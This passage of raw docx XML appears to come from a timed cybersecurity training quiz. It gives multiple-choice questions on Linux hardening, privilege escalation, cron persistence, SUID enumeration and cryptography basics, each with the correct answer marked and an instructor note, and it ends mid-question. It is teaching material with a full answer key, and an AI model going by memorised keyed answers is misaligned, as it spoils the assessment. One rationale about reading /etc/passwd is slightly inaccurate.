        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which command adds a new user called "analyst" to a Linux system?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) newuser analyst</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) create user analyst</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>useradd analyst</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) addaccount -u analyst</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* useradd creates the account; passwd analyst sets the password. Two-step process.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q39</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is "privilege escalation" in the context of Linux security?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Giving all users administrator access to improve workflow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A technique where an attacker gains higher permissions than they were originally granted</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Updating user privileges through the HR system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Using sudo to perform a single administrative task</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Vertical escalation (user → root). Horizontal escalation (user A → user B). Both are critical concepts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q40</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A suspicious cron job runs every night at 2 AM. Which file would a Linux admin check to find scheduled tasks?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) /etc/services</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) /var/log/cron.log only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/etc/crontab and user crontabs via `crontab -l`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) /proc/scheduler</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Persistence mechanism — attackers hide backdoors in cron jobs. Windows Event ID 4698 equivalent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q41</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The command `netstat -tulpn` is used to:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Test network speed to all connected devices</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Block suspicious network connections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Show all open ports and the processes listening on them</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Display all network routes configured on the system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">*Instructor Note:* -t=TCP, -u=UDP, -l=listening, -p=process, -n=numeric. Alternative: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ss -tulpn</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on modern systems.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q42</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Linux command searches for all files with SUID bit set (potential privilege escalation vectors)?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) ls -s / 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) locate suid / 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>find / -perm -4000 2&gt;/dev/null</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) grep -r "SUID" /etc 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* SUID = runs as file owner regardless of who executes. Exploiting SUID root binaries = classic root escalation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q43</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the principle behind "defence in depth" for system administration?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) One very strong firewall protects all assets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Physical security is more important than digital controls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Multiple overlapping layers of security so no single failure compromises everything</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Deeper network inspection is always more secure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Swiss cheese model — each layer has holes, but holes don't line up when layered.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q44</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An attacker gains access to a web server and notices it runs as root. Why is this a critical finding?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Root processes use more memory and slow down the server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Web servers cannot run as root on modern Linux systems</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Any code executed by the web server (e.g., via RCE) would have full system privileges</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Root processes are logged differently and easier to track</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* RCE + root web process = instant full compromise. Web servers should run as www-data or nginx user.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q45</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A junior admin at a Lagos company runs `chmod 777 /etc/passwd` because users were getting permission errors. What are the TWO security risks this creates?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Faster login times and increased CPU usage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Loss of audit trail and higher electricity consumption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Anyone can read all usernames AND anyone can modify the passwd file to create rogue accounts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) File becomes read-only and users still cannot log in</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* 777 on /etc/passwd = disaster. World-writable system files enable account creation, privilege escalation. Real-world mistake. Debrief: correct permissions = 644 for /etc/passwd, 640 for /etc/shadow.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 4 [INTERMEDIATE]: Cryptography &amp; PKI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Intermediate | Questions: Q46–Q60*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q46</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Symmetric encryption uses:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) One public key and one private key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A digital certificate issued by a CA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The same key for both encryption and decryption</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A hash function to scramble data</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Symmetric = same key shared between parties. Fast but key distribution is the challenge.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q47</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which encryption standard is currently recommended for protecting sensitive data at rest?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) DES (56-bit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) 3DES (112-bit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) RC4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AES-256</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* AES = Advanced Encryption Standard. 256-bit key. US Government classified data uses AES-256.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q48</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the key difference between hashing and encryption?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Hashing uses keys; encryption does not</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Encryption is faster than hashing for large files</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hashing is one-way (irreversible); encryption is two-way (reversible with key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Hashing produces longer output than encryption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Fundamental distinction — passwords should be hashed, not encrypted. If you can decrypt a password, that's a design flaw.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q49</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Why is MD5 considered broken for security purposes?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) It produces output that is too long to store efficiently</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) It requires a secret key which is difficult to manage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) It is too slow for modern computers to compute</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Collision attacks can produce the same MD5 hash from two different inputs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* MD5 collisions demonstrated in 2004 (Xiaoyun Wang). Used for file integrity only if no better option. Not for passwords.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q50</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which hashing algorithm is recommended for storing user passwords?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) MD5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) SHA-1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) SHA-256</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bcrypt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* bcrypt = slow by design + salt included. SHA-256 is fast = bad for passwords (enables GPU brute-force). Also acceptable: Argon2, scrypt.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q51</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>In asymmetric encryption, what is used to ENCRYPT a message that only the recipient can decrypt?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The sender's private key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The recipient's private key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The recipient's public key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A shared symmetric key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Encrypt with public key → only matching private key decrypts. Lock analogy: anyone can lock (public), only owner unlocks (private).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q52</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Digital signatures use private keys to sign and public keys to verify. This provides:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Confidentiality and availability</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Speed and compression</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication and non-repudiation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Encryption and obfuscation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Opposite of encryption flow — sign with PRIVATE, verify with PUBLIC. Proves identity + can't deny sending.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q53</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What role does a Certificate Authority (CA) play in PKI?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Generates private keys for all users on a network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Stores all encrypted communications for later decryption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vouches for the identity of certificate holders by digitally signing their certificates</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
